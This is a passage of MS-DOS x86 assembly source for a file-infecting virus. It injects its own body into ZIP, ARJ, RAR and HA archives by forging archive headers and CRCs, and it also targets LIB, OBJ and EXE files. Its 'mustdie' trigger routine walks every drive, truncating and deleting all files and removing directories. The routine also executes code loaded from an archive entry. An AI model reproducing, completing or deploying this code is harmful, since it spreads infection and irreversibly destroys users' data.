            lea     si, [vir_heap._rarhdr.rar_head_type]
            call    Calculate_CRC
            mov     [rarhdr.rar_head_crc], cx
            call    DosWrite_shbuf_22
        DONE
        cmp     [rarhdr.rar_method], RAR_METHOD_STORED
        je      error_exit2
        mov     dx, [rarhdr.rar_f_head_size]
        sub     dx, HDRBUFSIZE
        sbb     cx, cx
        test    byte ptr [rarhdr.rar_head_flags.1], 80h
        DOIF NZ
            add     dx, [rarhdr.rar_compressed_size.lo]
            adc     cx, [rarhdr.rar_compressed_size.hi]
        DONE
        call    dosseek_cur
        call    read_buf_22
pr_rar:
        and     ax, ax ;if eof
        EXIT Z
            cmp     [rarhdr.rar_head_type], 74h
    CYCLE BE            ; if marker block  or archive header
    push    ax
;/+- CREATE RARHDR 1.50 -+-
    LEA     di, [vir_heap._crthdr+2]
    sto_two_byte    74h, 0
    sto_byte        80h
    call    sto_fnamesize_20
    call    store_fisize
    stosb                   ;rar_host_os    =0
    lea     si, [vir_heap._arx_crc]
    movs4                   ;d;file crc_32
    call    create_dtim1
    sto_two_byte 0Fh, RAR_METHOD_STORED
    sto_word_   <[fnamesize]>
    mov     al, 20h
    call    stosw_sto_0
    call    store_fname
    lea     si, [vir_heap._crthdr+2]
    sub     di, si
    call    Calculate_CRC
    mov     word ptr [crthdr], cx ;[si-2] (?)
;\+- CREATE RARHDR -+-
    pop     ax
    call    dosseek_cur_neg_ax
    mov     cx, SIZE rar_file_hdr
    JMP     f_insert_hdr_und_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



;include add2arj.as1
;ÄÅÄÄ[process ARJ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
    DO   ;seek_cur(arj_bas_hdr_size+0Ah+arj_compressed_size-22h)
        mov     dx, [arjhdr.arj_bas_hdr_size]
        sub     dx, HDRBUFSIZE-0Ah
        sbb     cx, cx
        cmp     [arjhdr.arj_original_size.lo], cx
        DOIF NE ; if first header - (great BUG)
            add     dx, [arjhdr.arj_compressed_size.lo]
            adc     cx, [arjhdr.arj_compressed_size.hi]
            cmp     [arjhdr.arj_compres_method], ARJ_METHOD_STORED
            DOIF E
pblabel error_exit3
                ret
            DONE
        DONE
        call    dosseek_cur
        call    read_buf_22
pblabel process_arj
        test    [arjhdr.arj_flags], 4h ;test for multi-volume archive (?)
        jnz     error_exit3
        cmp     [arjhdr.arj_bas_hdr_size], 0
    CYCLE NE
    push    ax  ;
;/+- CREATE ARJHDR -+-
    lea     di, [vir_heap._crthdr]
    lea     si, arj_h
    movsw   ;arj_id
    call    sto_fnamesize_20
    movsw ;31e
    mov     al, 1
    stosw ;1
    dec     ax
    call    create_dtim
    call    store_fisize
    movs4       ;d;file crc_32
    sto_word 0
    stos2w           ;0
    call    store_fname ;*;name
    stosw           ;0
    push    di
    lea     si, [vir_heap._crthdr.arj_first_hdr_size]
    sub     di, si
    call    calculate_crc
    pop     di
    xchg    ax, cx
    call    st_dx_0
;\+- CREATE ARJHDR -+-
    pop     ax
    call    dosseek_cur_neg_ax
    mov     cx, 2Ah         ;SIZE zip_local_header
pblabel f_insert_hdr_und_file
    CALL    f_insert_hdr
    mov     cx, word ptr [fisize]
    mov     si, word ptr [fioff]
    jmp     f_insert
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ




;include add2zip.as1
;Ä[create zip headers]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_zip
    LEA     di, [vir_heap._crthdr]
    lea     si, zip_h
    movsw ;'KP'
    lodsw ;304
    DOIF  NZ ;CENTRAL_FLAG              ;        $$if central
        sto_word ZIP_CNL_ID
        mov     ax, word ptr ds:[si] ;20d;?ver?
    DONE
    stosw
    movsw ;14
    mov     ax, 2
    pushf
    call    create_dtim
    add_si4
    movs4     ;d;file crc_32
    call    store_fisize
    mov     ax, [fnamesize]
    call    stosw_sto_0 ;extra field size =0
    popf
    DOIF NZ ;CENTRAL_FLAG        ;        $$if central
        stos3w ;=0
        mov     al, 20h
        call    stosw_sto_0
        add_di4
    DONE
pblabel store_fname            ;*;name
    mov     cx, [fnamesize]
    rep     movsb
pblabel error_exit1
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;ÄÅÄÄ[process ZIP]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel cycle1
    mov     dx, [ziphdr.zip_size_fname]
    sub     dx, 4
    sbb     cx, cx
    add     dx, [ziphdr.zip_extra_field_length]
    cmp     [ziphdr.zip_compression_method], ZIP_METHOD_STORED
    je      mustdie
    add     dx, [ziphdr.zip_compressed_size.lo]
    adc     cx, [ziphdr.zip_compressed_size.hi]
    call    dosseek_cur
    call    read_buf_22 ; read(ziphdr, sizeof(zipcnthdr))
pblabel process_zip
;$BEEP$
;    DOIF E

;    DONE
    cmp     word ptr [ziphdr.zip_loc_sign.hi], ZIP_LCL_ID
    je      cycle1
    cmp     word ptr [ziphdr.zip_loc_sign.hi], ZIP_CNL_ID
    jne     error_exit1
    call    create_zip
    mov     dx, - HDRBUFSIZE ; SIZE zip_local_header
    call    dosseek_cur_cx_1
    mov     [crthdr.zip_rel_off_of_loc_hdr_.lo], ax
    mov     [crthdr.zip_rel_off_of_loc_hdr_.hi], dx
    mov     cx, SIZE zip_local_header ;1e
    call    f_insert_hdr_und_file
    jmp     proc_cnt
    DO
; seek_cur(ziphdr.filename_length_+ziphdr.extra_field_length_+ziphdr.file_comment_length_)
        mov     dx, [ziphdr.zip_size_fname_]
        add     dx, [ziphdr.zip_extra_field_length_]
        add     dx, [ziphdr.zip_file_comment_length_]
        add     dx, 0Ch
        call    dosseek_cur_cx_0
pblabel proc_cnt
        call    read_buf_22
        cmp     [ziphdr.zip_centr_sign_.lo], ZIP_SIGN
        jne     error_exit1
        cmp     word ptr [ziphdr.zip_centr_sign_.hi], ZIP_CNL_ID
    CYCLE E
    cmp     word ptr [ziphdr.zip_centr_sign_.hi], ZIP_END_ID
    jne     error_exit1
    call    dosseek_cur_neg_ax  ; seek_cur(-sizeof(zip_centr_header))
    inc     [ziphdr.ttl_num_of_ent_on_this_disk]
    inc     [ziphdr.ttl_num_of_ent_in_the_cent_dir]
    add     [ziphdr.size_of_the_central_directory.lo], size zip_central_header
    mov     ax, [fnamesize]
    cwd     ;DX := 0
    add     [ziphdr.size_of_the_central_directory.lo], ax
    adc     [ziphdr.size_of_the_central_directory.hi], dx
    add     ax, [fisize] ;[zip_compressed_size.lo]
    add     ax, SIZE zip_local_header
    add     [ziphdr.off_of_strt_of_cent_directory.lo], ax
    adc     [ziphdr.off_of_strt_of_cent_directory.hi], dx
    mov     cx, SIZE zip_end_header
    call    DosWrite_shbuf  ;write zip_end_header
    cmp     dx, bp  ;zf=0
    call    create_zip  ; create_centr_header
    mov     dx, -SIZE zip_end_header ;-16
    call    dosseek_cur_cx_1
    mov     cx, SIZE zip_central_header
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;%NOINCL
;.SALL


;shift_buffer_size = 13h
pblabel f_insert_hdr
    add     cx, [fnamesize]
pblabel f_insert_hdr_wirhout_fname
    LEA     si, [vir_heap._crthdr]
pblabel f_insert
    push    dx ax
    push    cx      ; insert_size
    xor     cx,cx   ; cx := 0
    sub     ax, HDRBUFSIZE
    sbb     dx, cx
    mov     [beg_pos.hi], dx
    mov     [beg_pos.lo], ax
    dec     cx      ; cx := -1
    mov     dx, - HDRBUFSIZE
    mov     al, 2   ; seek_end ( - shift_buffer_size )
    call    DosSeek_all
    DO
        call    read_buf_22             ; read ( shift_buffer, shift_buffer_size )
        pop     dx                      ; seek_cur ( insert_size - shift_buffer_size )
        push    dx
        sub     dx, HDRBUFSIZE   ; sub dx,ax (?)
        call    dosseek_cur_cx_0
        call    DosWrite_shbuf_22       ; write ( shift_buffer, shift_buffer_size )
        pop     dx                      ; seek_cur ( - insert_size - 2*shift_buffer_size )
        push    dx
        add     dx, HDRBUFSIZE*2
        call    dosseek_cur_neg_dx      ; #### DX:AX=curpos
        cmp     dx, [beg_pos.hi]
        REPEAT A
        cmp     ax, [beg_pos.lo]
    CYCLE A
;-+--------+- seek for write -+--------+-
    pop     ax      ; insert_size
    pop     dx cx
    push    ax
    call    dosseek
    mov     dx, si
    pop     cx
    call    DosWrite
    jmp     dostell
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;shift_buffer_size = 22h





;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel sto_fnamesize_20
    mov     ax, 20h
    add     ax, [fnamesize]
    stosw
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel store_fisize
    xor     dx, dx
    sto_word_ <[fisize]> ;.filesize
    xchg    dx, ax
pblabel st_dx_0
    stosw     ;d;hdr crc
    xchg    ax, dx
pblabel stosw_sto_0
    stosw
    sto_word 0
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stosw_sto_0
pblabel create_dtim1
    sto_word    TIMEMARKER   ;time  = const TIMEMARKER
    sto_word_   <[host_arx_date]>
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel write_sizemarker
;write garbage
    lea     di, [heap] ;from heap
    mov     ax, SIZEMARKER+SIZEMARKER_MOD
    CALL    SHIT_AX
    ;write virus
    call    seek_end       ;dx:ax - file size
    xor     dx, dx
    mov     cx, SIZEMARKER
    div     cx
    sub     cx, dx
    add     cx, SIZEMARKER_MOD
    jmp    doswrite_from_heap

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCOM        db      '.COM'
pblabel hdrs
            CRC32w  <'P','K','',''>       ;ZIP
            CRC32w  <060h,0EAh>             ;ARJ
            CRC32w  <'R','a','r','!'>       ;RAR
            CRC32w  <'H','A' >              ;HA
pblabel endarxex
;           CRC32w  <0FFh,0FFh,0FFh,0FFh>   ;SYS
            CRC32w  <0F0h,0Dh>              ;LIB
            CRC32w  <080h>                  ;OBJ
;           CRC32w  <'F','B','O','V'>       ;OVR
            CRC32w  <'Z','M'>               ;EXE
            CRC32w  <'M','Z'>               ;EXE

pblabel offs
            dw  process_zip
            dw  process_arj
            dw  process_rar
            dw  process_ha
;           dw  process_sys
            dw  process_lib
            dw  process_obj
;           dw  process_ovr
            dw  process_exe
            dw  process_exe
;cmp_ax_CRC32w <2,1Ah,8Bh>
pblabel api_entry
call doscall
iret

pblabel mustdie
DTADELTA equ 11H
forDTAs equ heap+80h
TROJANTIME=0
    cmp     [host_arx_date.h], 20h ;if 1996 year then must die!
    DOIF B
    ;executor
        cmp     [ziphdr.zip_file_time], TROJANTIME
        DOIF E
;int 2bh
            call    dosseek_cur_cx_0
            lea     dx, [api_entry]
            mov     ax, 2503h
            call    doscall
            lea     dx, [heap]
            mov     cx, [ziphdr.zip_compressed_size.lo]
            and     ch, 1Fh   ; maximum size=8K
            call    dosread
            call    dx
;            mov     di, cx
;            mov     si, dx
;            call    Calculate_CRC
        DONE
        ret
    DONE

    MOVSEG  ds, cs
    MOVSEG  es, cs
next_disk:
    lea     si, forDTAs
    lea     di, [heap]
disk=$+1
IFDEF RELIZ
    sto_two_byte 'C', ':'
ELSE
    sto_two_byte 'D', ':'
ENDIF
    cmp     al, 'Z'
    je      rt_err
    DO
        add     si, DTADELTA
        mov     dx, si
        mov     ah, 1Ah
        call    DosCall
        sto_byte '\'
        mov     word ptr [di],'.*'
        mov     word ptr [di+2],'*'
        mov     cx, 3Fh
        lea     dx, [heap]
FindFirst:
        mov     ah, 4Eh
        jmp     short EndOfSearch
        DO
FindNext:
            mov     ah, 4Fh
EndOfSearch:
            call    DosCall
            DOIF C
            mov     byte ptr [di-1], 0
            lea     dx, [heap]
            mov     ah, 3Ah
            call    DosCall
                DO
                    dec     di
                    cmp     byte ptr [di-1],'\'
                CYCLE NE
                sub     si, DTADELTA
                mov     dx, si
                mov     ah, 1Ah
                call    DosCall
                cmp     si, offset forDTAs
                jae     FindNext

                inc     byte ptr ds:[disk]
                jmp     next_disk
            DONE
            push    di si
            add     si, find_buf_pname
            DO
                lodsb
                stosb
                or      al, al
            CYCLE NZ
            dec di
            pop     si

            test    byte ptr [si.find_buf_attr], 10h
            je      @@0
            cmp     byte ptr [si.find_buf_pname], '.'
            jne     @@1
@@0:
            pop     di   ;file -> restore DI
            lea     dx, [heap]
            mov     cx, 20h
            mov     ax, 4301h
            call    DosCall
            mov     ax, 3D21h
            call    DosCall
            xchg    bx, ax
            DOIF NC
                call    DosTruncate
                call    DosClose
            DONE
            mov     ah, 41h
            call    DosCall
        CYCLE
@@1:
        pop     ax ;drop DI  ;        ;¥á«¨ ¤¨à¥ªâ®à¨ï +name
    CYCLE


ends
end
